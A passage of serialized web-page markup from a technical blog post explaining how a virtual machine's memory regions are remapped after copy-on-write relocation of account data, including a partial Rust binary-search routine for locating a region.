sm:text-justify\",\"style\":{\"display\":\"block\",\"listStyleType\":\"decimal\",\"paddingInlineStart\":\"40px\"},\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Locate the Target Region\"}],\": Use \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\" to find the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" that maps the account's data. This address should correspond to a virtual address within one of the \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\"'s ranges.\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Compare Buffer Addresses\"}],\": Check if the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\"'s current \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" matches the account's actual data buffer address in \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\". If they differ, a relocation occurred during CoW operations.\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Update the Mapping\"}],\": Replace the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\"'s \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" with the new buffer address from \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\", ensuring future VM memory accesses resolve to the correct location.\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Complete the Update\"}],\": After updating \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\", when the parent program accesses memory at the same virtual address, it will now correctly resolve to the relocated buffer location.\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-93\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/memoryregion_update.png\",\"alt\":\"MemoryRegion Update\"}]}],\"\\n\",[\"$\",\"p\",\"p-94\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"This mechanism relies on an assumption: that \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\" accurately identifies the correct \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" to update.\"]}],\"\\n\",[\"$\",\"p\",\"p-95\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"The code of searching for a region containing some specific \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_addr\"}],\" is shown here\"]}],\"\\n\",[\"$\",\"pre\",\"pre-10\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"rounded-sm\",\"style\":{\"color\":\"#ccc\",\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#ccc\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[1]}],[\"$\",\"span\",\"code-segement1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"impl\"]}],[\"$\",\"span\",\"code-segement2\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement3\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement4\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement5\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"UnalignedMemoryMapping\"]}],[\"$\",\"span\",\"code-segement7\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement15\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find_region\"]}],[\"$\",\"span\",\"code-segement22\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement29\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MappingCache\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement34\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement42\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Option\"]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"MemoryRegion\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement49\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement55\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Some\"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement60\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" cache\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"find\"]}],[\"$\",\"span\",\"code-segement65\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement70\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement77\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"else\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement88\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement93\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// region_addresses is eytzinger ordered array of MemoryRegions, so we\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// do a binary search here \"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"while\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" index \"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c=\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement110\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region_addresses\"]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"len\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}],[\"$\",\"span\",\"code-segement121\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// we start the search at index=1 and in the loop condition check\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// for index \u003c= len, so bound checks can be avoided\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                index \"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\u003c\"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"+\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement145\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"region_addresses\"]}],[\"$\",\"span\",\"code-segement153\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_unchecked\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"index \"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"-\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"1\"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token 